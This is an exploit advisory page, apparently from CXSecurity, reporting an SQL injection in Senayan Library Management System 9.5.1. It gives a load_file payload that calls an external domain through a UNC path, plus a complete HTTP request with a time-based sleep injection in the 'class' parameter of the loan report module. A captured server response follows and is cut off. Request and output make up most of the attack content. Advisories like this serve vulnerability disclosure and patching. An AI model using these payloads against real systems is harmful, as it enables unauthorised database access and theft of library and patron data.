---
title: Senayan Library Management System 9.5.1 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022120016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-08
fetch_date: 2025-10-04T00:52:17.605991
---

# Senayan Library Management System 9.5.1 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Senayan Library Management System 9.5.1 SQL Injection** **2022.12.07**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Senayan Library Management System v9.5.1 a.k.a SLIMS 9 SQLi
## Author: nu11secur1ty
## Date: 12.06.2022
## Vendor: https://slims.web.id/web/
## Software: https://slims.web.id/web/news/rilis-9.5.1/
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.5.1
## Description:
The manual insertion `point 4` appears to be vulnerable to SQL
injection attacks.
The payload '+(select
load\_file('\\\\mmceb8f9w8n0s3mutza4ttmxzo5it8hzknbdy6mv.again.com\\ejf'))+'
was submitted in the manual insertion `point 4` testing.
This payload injects a SQL sub-query that calls MySQL's load\_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
The attacker can execute a very dangerous `subquery` to view very
sensitive information.
## STATUS: HIGH Vulnerability
[+] Payload:
```MySQL
GET /slims9\_bulian-9.5.1/admin/modules/reporting/customs/loan\_by\_class.php?reportView=true&year=2002&class=bbbb%27%2b(select\*from(select(sleep(5)))a)%2b%27&membershipType=a&collType=aaaa
HTTP/1.1
Host: pwnedhost.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SenayanAdmin=tc5upjgvv2j3mid2ur5tdmmpje; admin\_logged\_in=1;
SenayanMember=schm4nbtgbb5i1tbeonr6cav3u
Connection: close
```
[+] Response:
```MySQL
HTTP/1.1 200 OK
Date: Tue, 06 Dec 2022 13:51:38 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
X-Frame-Options: SAMEORIGIN
X-Powered-By: PHP/7.4.30
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Length: 4120
Connection: close
Content-Type: text/html; charset=UTF-8
<!doctype html>
<html>
<head><title>Loan Report by Class Report</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<meta http-equiv="Pragma" content="no-cache"/>
<meta http-equiv="Cache-Control" content="no-store, no-cache,
must-revalidate, post-check=0, pre-check=0"/>
<meta http-equiv="Expires" content="Sat, 26 Jul 1997 05:00:00 GMT"/>
<link rel="stylesheet" type="text/css"
href="/slims9\_bulian-9.5.1/css/bootstrap.min.css"/>
<link rel="stylesheet" type="text/css"
href="/slims9\_bulian-9.5.1/admin/admin\_template/default/style.css?31085233"/>
<script type="text/javascript"
src="/slims9\_bulian-9.5.1/js/jquery.js"></script>
<script type="text/javascript"
src="/slims9\_bulian-9.5.1/js/gui.js"></script>
</head>
<body>
<div id="pageContent">
<div class="mb-2">Loan Recap By Class
<strong>bbbb'+(select\*from(select(sleep(5)))a)+'</strong> for year
<strong>2002</strong> <a class="s-btn btn btn-default printReport"
onclick="window.print()" href="#">Print Current Page</a><a
href="../xlsoutput.php" class="s-btn btn btn-default"
target="\_BLANK">Export to spreadsheet format</a>
<a class="s-btn btn btn-info notAJAX openPopUp"
href="/slims9\_bulian-9.5.1/admin/modules/reporting/pop\_chart.php"
width="700" height="530" title="Loan Recap By Class">Show in
chart/plot</a></div>
<table class="s-table table table-sm table-bordered"><tr><th
class="dataListHeaderPrinted">Classification</th><th
class="dataListHeaderPrinted">Jan</th><th
class="dataListHeaderPrinted">Feb</th><th
class="dataListHeaderPrinted">Mar</th><th
class="dataListHeaderPrinted">Apr</th><th
class="dataListHeaderPrinted">May</th><th
class="dataListHeaderPrinted">Jun</th><th
class="dataListHeaderPrinted">Jul</th><th
class="dataListHeaderPrinted">Aug</th><th
class="dataListHeaderPrinted">Sep</th><th
class="dataListHeaderPrinted">Oct</th><th
class="dataListHeaderPrinted">Nov</th><th
class="dataListHeaderPrinted">Dec</th></tr><tr><td><strong>bbbb'+(select\*from(select(sleep(5)))a)+'00</strong></td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'00</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'10</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'20</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'30</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'40</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'50</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'60</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'70</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*from(select(sleep(5)))a)+'80</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><tr><td>bbbb'+(select\*fr...